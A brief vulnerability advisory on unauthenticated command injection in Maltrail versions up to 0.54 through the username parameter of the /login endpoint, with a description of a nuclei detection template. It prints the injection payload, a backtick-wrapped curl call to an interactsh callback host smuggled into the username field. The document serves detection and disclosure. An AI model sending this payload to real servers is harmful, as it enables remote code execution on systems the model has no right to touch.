## Vulnerability

Maltrail versions <=0.54 are vulnerable to unauthenticated remote command execution. Attackers can inject and execute arbitrary operating system commands via the `username` parameter in a POST request to the `/login` endpoint, leading to complete server compromise.

## PoC / Detection
Classification: rce

The nuclei template detects this by issuing a single raw POST request to `/login` with form-encoded payload `username=;`curl http://{{interactsh-url}}`` and matching on the response header containing "Maltrail" together with confirmation of an out-of-band interactsh interaction (HTTP or DNS protocol) that proves successful command injection and execution.
